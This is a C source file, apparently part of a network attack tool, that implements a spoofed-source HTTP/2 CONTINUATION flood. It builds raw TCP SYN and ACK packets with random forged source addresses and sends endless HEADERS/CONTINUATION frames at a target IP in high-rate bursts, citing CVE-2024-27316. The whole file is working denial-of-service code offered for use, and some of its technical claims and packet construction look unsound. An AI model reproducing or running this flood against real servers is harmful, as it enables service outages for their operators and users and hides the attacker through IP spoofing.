#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/uio.h>

#define H2C_BURST 512
#define MAX_STREAMS 65535

static __thread unsigned int h2c_rng = 0;

static inline unsigned int h2c_rand(void) {
    if (h2c_rng == 0) h2c_rng = (unsigned int)(time(NULL) ^ (uintptr_t)&h2c_rng);
    h2c_rng = h2c_rng * 1103515245U + 12345U;
    return h2c_rng;
}

/* HTTP/2 frame header: length(3) + type(1) + flags(1) + stream_id(4) = 9 bytes */
struct h2_frame {
    uint8_t len[3];
    uint8_t type;
    uint8_t flags;
    uint8_t stream_id[4];
};

static void h2_set_len(struct h2_frame *f, int len) {
    f->len[0] = (len >> 16) & 0xFF;
    f->len[1] = (len >> 8) & 0xFF;
    f->len[2] = len & 0xFF;
}

static void h2_set_sid(struct h2_frame *f, uint32_t sid) {
    f->stream_id[0] = (sid >> 24) & 0x7F;
    f->stream_id[1] = (sid >> 16) & 0xFF;
    f->stream_id[2] = (sid >> 8) & 0xFF;
    f->stream_id[3] = sid & 0xFF;
}

/* Build raw TCP SYN packet for H2 connection */
static int build_tcp_syn_pkt(unsigned char *buf, uint32_t src_ip, uint32_t dst_ip,
                             uint16_t src_port, uint16_t dst_port, uint32_t seq) {
    struct iphdr *ip = (struct iphdr *)buf;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
    int total = sizeof(struct iphdr) + sizeof(struct tcphdr);
    memset(buf, 0, total);
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(total);
    ip->id = htons((uint16_t)(h2c_rand() & 0xFFFF));
    ip->ttl = 64; ip->protocol = IPPROTO_TCP;
    ip->saddr = src_ip; ip->daddr = dst_ip;
    ip->check = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip;
      for (int i = 0; i < 10; i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16);
      ip->check = ~s & 0xFFFF; }
    tcp->source = htons(src_port); tcp->dest = htons(dst_port);
    tcp->seq = htonl(seq); tcp->doff = 5;
    tcp->syn = 1; tcp->window = htons(65535);
    struct { uint32_t saddr, daddr; uint8_t zero, proto; uint16_t len; } ph;
    ph.saddr = src_ip; ph.daddr = dst_ip; ph.zero = 0;
    ph.proto = IPPROTO_TCP; ph.len = htons(sizeof(struct tcphdr));
    { uint32_t s = 0; uint16_t *p = (uint16_t *)&ph;
      for (int i = 0; i < 6; i++) s += p[i];
      p = (uint16_t *)tcp;
      for (int i = 0; i < (int)(sizeof(struct tcphdr)/2); i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16);
      tcp->check = ~s & 0xFFFF; }
    return total;
}

static int build_tcp_ack_pkt(unsigned char *buf, uint32_t src_ip, uint32_t dst_ip,
                             uint16_t src_port, uint16_t dst_port,
                             uint32_t seq, uint32_t ack_seq) {
    int total = sizeof(struct iphdr) + sizeof(struct tcphdr);
    build_tcp_syn_pkt(buf, src_ip, dst_ip, src_port, dst_port, seq);
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
    tcp->syn = 0; tcp->ack = 1; tcp->ack_seq = htonl(ack_seq);
    struct iphdr *ip = (struct iphdr *)buf;
    uint32_t saddr = ip->saddr, daddr = ip->daddr;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip;
      for (int i = 0; i < 10; i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16);
      ip->check = ~s & 0xFFFF; }
    struct { uint32_t saddr, daddr; uint8_t zero, proto; uint16_t len; } ph;
    ph.saddr = saddr; ph.daddr = daddr; ph.zero = 0;
    ph.proto = IPPROTO_TCP; ph.len = htons(sizeof(struct tcphdr));
    { uint32_t s = 0; uint16_t *p = (uint16_t *)&ph;
      for (int i = 0; i < 6; i++) s += p[i];
      p = (uint16_t *)tcp;
      for (int i = 0; i < (int)(sizeof(struct tcphdr)/2); i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16);
      tcp->check = ~s & 0xFFFF; }
    return total;
}

/* Build HTTP/2 PRI * HTTP/2.0 preface + SETTINGS frame */
static int build_h2_preface(unsigned char *buf, unsigned char **settings_out, int *settings_len) {
    int off = 0;
    memcpy(buf + off, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 24); off += 24;
    struct h2_frame *sf = (struct h2_frame *)(buf + off);
    off += sizeof(struct h2_frame);
    h2_set_len(sf, 4);
    sf->type = 4; sf->flags = 0; h2_set_sid(sf, 0);
    buf[off++] = 0x00; buf[off++] = 0x00; buf[off++] = 0x00; buf[off++] = 0x03;
    *settings_out = buf + 24;
    *settings_len = off - 24;
    return off;
}

/* Build HEADERS frame with END_HEADERS=false — allows CONTINUATION attack */
static int build_h2_headers(unsigned char *buf, uint32_t stream_id) {
    struct h2_frame *fh = (struct h2_frame *)buf;
    h2_set_len(fh, 0);
    fh->type = 1;
    fh->flags = 0;
    h2_set_sid(fh, stream_id);
    return (int)sizeof(struct h2_frame);
}

/* Build CONTINUATION frame with :method GET and large padding */
static int build_h2_continuation(unsigned char *buf, uint32_t stream_id, int end_headers) {
    struct h2_frame *fc = (struct h2_frame *)buf;
    unsigned char *payload = buf + sizeof(struct h2_frame);

    /* HPACK compressed header: :method GET with large name/value */
    int off = 0;
    payload[off++] = 0x40 | 0x0F; /* literal, incremental, name len=15 */
    memcpy(payload + off, ":methodXXXXXXXX", 15); off += 15;
    payload[off++] = 0x7F; /* value len (7-bit prefix, long form) */
    payload[off++] = 0x80 | 0x01; /* extended length */
    /* Large padding value to consume CPU */
    memset(payload + off, 'A', 1024); off += 1024;

    h2_set_len(fc, off);
    fc->type = 9;
    fc->flags = end_headers ? 0x04 : 0x00;
    h2_set_sid(fc, stream_id);
    return (int)(sizeof(struct h2_frame) + off);
}

/* H2 CONTINUATION flood — CVE-2024-27316:
   Send HEADERS frame without END_HEADERS, then keep sending
   CONTINUATION frames. nginx <1.26.0 goes into infinite loop consuming 100% CPU.
   Even patched servers waste CPU parsing continuation frames. */
EXPORT int h2_continuation_loop(uint32_t target_ip, uint16_t target_port,
                                 uint32_t spoof_ip, int streams, int duration_sec) {
    if (streams < 1) streams = 100;
    if (streams > MAX_STREAMS) streams = MAX_STREAMS;
    if (duration_sec < 1) duration_sec = 30;

    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) return -1;
    int on = 1, buf = 128*1024*1024;
    setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    setsockopt(raw_sock, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    int pmtu = IP_PMTUDISC_DONT;
    setsockopt(raw_sock, IPPROTO_IP, IP_MTU_DISCOVER, &pmtu, sizeof(pmtu));

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = target_ip;

    uint32_t src_ip = spoof_ip ? spoof_ip : (uint32_t)(h2c_rand());
    uint16_t src_port = (uint16_t)(1024 + (h2c_rand() % 64511));
    uint32_t base_seq = h2c_rand();

    unsigned char syn_buf[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    unsigned char ack_buf[8192];
    unsigned char cont_buf[sizeof(struct iphdr) + sizeof(struct tcphdr) + 1280];

    time_t t_end = time(NULL) + duration_sec;
    uint64_t total_sent = 0;

    struct mmsghdr msgs[H2C_BURST];
    struct iovec iovecs[H2C_BURST];
    uint32_t stream_counter = 1;

    while (time(NULL) < t_end) {
        int batch = 0;
        while (batch < H2C_BURST) {
            uint32_t my_src = spoof_ip ? spoof_ip : (uint32_t)(h2c_rand());
            uint16_t my_port = 1024 + (uint16_t)(h2c_rand() % 64511);
            uint32_t my_seq = h2c_rand();
            uint32_t sid = stream_counter;
            stream_counter = (stream_counter % MAX_STREAMS) + 1;

            int plen;
            if (h2c_rand() % 4 == 0) {
                /* SYN — new connection (spoofed handshake) */
                plen = build_tcp_syn_pkt(syn_buf, my_src, target_ip,
                                         my_port, target_port, my_seq);
                iovecs[batch].iov_base = malloc(plen);
                memcpy(iovecs[batch].iov_base, syn_buf, plen);
                iovecs[batch].iov_len = plen;
            } else {
                /* ACK + H2 CONTINUATION payload */
                unsigned char *base = ack_buf;
                int tcp_off = build_tcp_ack_pkt(base, my_src, target_ip,
                                                my_port, target_port,
                                                my_seq, h2c_rand());
                unsigned char *h2_start = base + tcp_off;
                int off = 0;
                /* H2 preface + settings (first time only per src) */
                memcpy(h2_start, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 24);
                off += 24;
                struct h2_frame sf;
                h2_set_len(&sf, 4); sf.type = 4; sf.flags = 0; h2_set_sid(&sf, 0);
                memcpy(h2_start + off, &sf, 9); off += 9;
                h2_start[off++] = 0x00; h2_start[off++] = 0x00;
                h2_start[off++] = 0x00; h2_start[off++] = 0x03;
                /* HEADERS without END_HEADERS */
                off += build_h2_headers(h2_start + off, sid);
                /* 3-5 CONTINUATION frames */
                int cont_count = 3 + (h2c_rand() % 3);
                for (int c = 0; c < cont_count; c++) {
                    int end = (c == cont_count - 1) ? 1 : 0;
                    off += build_h2_continuation(h2_start + off, sid, end);
                }
                plen = tcp_off + off;
                unsigned char *pkt = malloc(plen);
                memcpy(pkt, base, plen);
                struct iphdr *ip = (struct iphdr *)pkt;
                ip->tot_len = htons(plen);
                iovecs[batch].iov_base = pkt;
                iovecs[batch].iov_len = plen;
            }

            msgs[batch].msg_hdr.msg_name = &dst;
            msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
            msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
            msgs[batch].msg_hdr.msg_iovlen = 1;
            batch++;
        }

        int off = 0, rem = batch;
        while (rem > 0) {
            int ret = (int)sendmmsg(raw_sock, msgs + off, rem, MSG_DONTWAIT);
            if (ret > 0) { off += ret; rem -= ret; total_sent += ret; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            else break;
        }
        for (int j = 0; j < batch; j++) free(iovecs[j].iov_base);
    }

    close(raw_sock);
    return (int)total_sent;
}
